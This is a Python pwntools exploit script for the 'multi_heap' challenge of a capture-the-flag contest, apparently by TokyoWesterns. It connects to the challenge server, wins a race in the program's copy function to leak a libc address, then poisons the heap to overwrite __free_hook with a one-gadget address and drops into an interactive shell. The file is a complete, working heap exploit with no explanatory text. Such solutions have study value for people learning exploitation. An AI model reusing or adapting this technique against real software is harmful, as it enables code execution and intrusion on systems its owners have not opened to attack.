from pwn import *

#p = process("./multi_heap-2faaaa3f601bbd51a7929f934754cb685c3f7f789abc1ce2e709b9ac7c1694ee")#,aslr=False)
p = remote("multiheap.chal.ctf.westerns.tokyo",10001)

def alloc(sel,siz,thr) :
	p.sendlineafter(":","1")
	p.sendlineafter(":",sel)
	p.sendlineafter(":",str(siz))
	p.sendlineafter(":",thr)

def free(idx) : 
	p.sendlineafter(":","2")
	p.sendlineafter(":",str(idx))

def write(idx) : 
	p.sendlineafter(":","3")
	p.sendlineafter(":",str(idx))

def read_ch(idx,size,content) : 
	p.sendlineafter(":","4")
	p.sendlineafter(":",str(idx))
	p.sendlineafter(":",str(size))
	p.sendlineafter(":",content)

def read(idx,size,content) : 
	p.sendlineafter(":","4")
	p.sendlineafter(":",str(idx))
	p.sendlineafter(":",str(size))
	sleep(0.05)
	p.sendline(content)

def copy(src,dst,size,thr) : 
	p.sendlineafter(":","5")
	p.sendlineafter(":",str(src))
	p.sendlineafter(":",str(dst))
	p.sendlineafter(":",str(size))
	p.sendlineafter(":",thr)


alloc('char',0x420,'m')

#raw_input()
cnt = 0

while True :
	cnt += 1
	print cnt


	for i in range(10) :
		print '[*] alloc %d' %i
		alloc('char',0x420,'y')

	#alloc('char',0x80,'m')
	#read(11,100,"A"*100)
	copy(0,2,10,'y')

	write(0)

	if p.recvuntil("=")[:-1].strip() != "" :
		break

	for i in range(10) :
		print '[*] free %d' %i
		print i
		free(i)


write(0)

libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x3ebca0

print hex(libcbase)


alloc('char',0x60,'m') #10

#raw_input()
cnt = 0

for i in range(8) :
	cnt += 1
	print cnt
	alloc('char',0x60,'y') #11
	alloc('char',0x60,'y') #12
	 
	copy(10,12,8,'y')
	free(12)

	read(10,8,p64(libcbase+0x3ed8e8)) #__free_hook

	
#raw_input()
alloc('char',0x60,'m')
alloc('char',0x60,'m')
read(29,9,p64(libcbase+0x4f322))
free(0) # oneshot

p.interactive()
